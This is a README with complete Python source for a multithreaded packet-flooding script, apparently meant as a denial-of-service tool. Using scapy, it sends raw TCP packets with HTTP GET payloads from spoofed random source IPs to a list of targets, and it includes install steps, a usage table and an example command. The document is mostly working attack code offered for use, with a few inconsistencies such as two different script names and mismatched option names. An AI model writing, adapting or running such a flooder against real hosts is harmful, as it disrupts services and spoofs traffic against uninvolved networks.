# Packet Flooding Script
- This script allows you to send random packets to target IP addresses or URLs using multiple threads.

### Requirements

```csharp
sudo apt install pip
pip install scapy
```

#### Usage
```python
python dosy.py [-h] [-t TARGET] [-T TARGET_FILE] [-i SOURCE_FILE] [-p PORT] [-l LOCAL_PORT] [-n NUM_THREADS] [-c COUNT]
```

|Argument|Argument|Description|
| -- | -- | -- |
|-h | --help | Show help message and exit|
|-t [TARGET] | --target [TARGET] | Target IP or URL|
|-T [TARGET_FILE] | --target-file [TARGET_FILE] | File containing a list of target IPs or URLs|
|-i [SOURCE_FILE] | --source-file [SOURCE_FILE] | File containing a list of source IPs rather than random IPs|
|-p [PORT] | --port [PORT] | Target port (default: 8080)|
|-l [LOCAL_PORT] | --local-port [LOCAL_PORT] | Local port|
|-n [NUM_THREADS] | --num-threads [NUM_THREADS] | Number of threads (default: 10)|
|-c [COUNT] | --count [COUNT] | Limit of packets to be sent|


##### Example Command
```python
python packet_flood.py -t 192.168.0.1 -p 80 -n 5 -c 100
```
- This will send 100 packets to IP `192.168.0.1` on port `80` using 5 threads.
- The `-t` or `--target` option must be used to specify a target IP or URL, or the `-T` or `--target-file` option must be used to specify a file containing a list of target IPs or URLs.
- If the `-i` or `--source-file` option is not used, the script will generate random source IPs for each thread.

### CODE
```python
#!/bin/python3
import argparse
import random
import threading
import time
from scapy.all import *

# User agent strings for GET requests
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
]

def get_args():
    parser = argparse.ArgumentParser(description="Send random packets to target(s)")
    parser.add_argument('-t', '--target', help='Target IP or URL')
    parser.add_argument('-T', '--target-file', help='File containing list of target IPs or URLs')
    parser.add_argument('-i', '--source-file', help='File containing list of source IPs')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Target port')
    parser.add_argument('-l', '--local-port', type=int, help='Local port')
    parser.add_argument('-n', '--num-threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-c', '--send-count', type=int, default=10, help='Number of packets to send across all threads')
    return parser.parse_args()

def send_packets(source, target, local_port, port, send_count):

    # source     - where the packet is coming from
    # target     - where the packet is going to
    # port       - what port we are sending the packet to
    # send_count - how many packets to send

    # starts a counter to keep track of sent packets
    packets_sent = 0
    while packets_sent < send_count:

        # randomly select a user agent
        user_agent = random.choice(BROWSERS)
        # set the user agent based on the random choice above
        headers = {"User-Agent": user_agent}

        # creates the packet
        packet = IP(src=source, dst=target) / TCP(sport=local_port, dport=port) / Raw("GET / HTTP/1.1\r\n") + \
                 Raw("\r\n".join(f"{key}: {value}" for key, value in headers.items()) + "\r\n\r\n")

        # send the packet
        send(packet, verbose=False)

        # print the output to terminal
        print(f"Sent packet to {target}:{port} from source IP: {source}, local port: {local_port}, User-Agent: {user_agent}")

        packets_sent += 1
        time.sleep(random.uniform(0, 2))

def main():
    args = get_args()
    if not args.target and not args.target_file:
        print("Error: either --target or --target-file must be specified")
        return

    if args.target:
        targets = [args.target]
    else:
        with open(args.target_file) as f:
            targets = f.read().splitlines()

    if args.source_file:
        with open(args.source_file) as f:
            sources = f.read().splitlines()
    else:
        # if no source IP specified, generate random source IP
        sources = ['.'.join(map(str, (random.randint(0, 255) for _ in range(4))))]

    send_count_per_thread = args.send_count // args.num_threads
    remaining_packets = args.send_count % args.num_threads

    for _ in range(args.num_threads):
        source = random.choice(sources)
        target = random.choice(targets)
        local_port = args.local_port if args.local_port else random.randint(1024, 65535)
        packets_to_send = send_count_per_thread
        if remaining_packets > 0:
            packets_to_send += 1
            remaining_packets -= 1
        t = threading.Thread(target=send_packets, args=(source, target, local_port, args.port, packets_to_send))
        t.start()

if __name__ == '__main__':
    main()
```
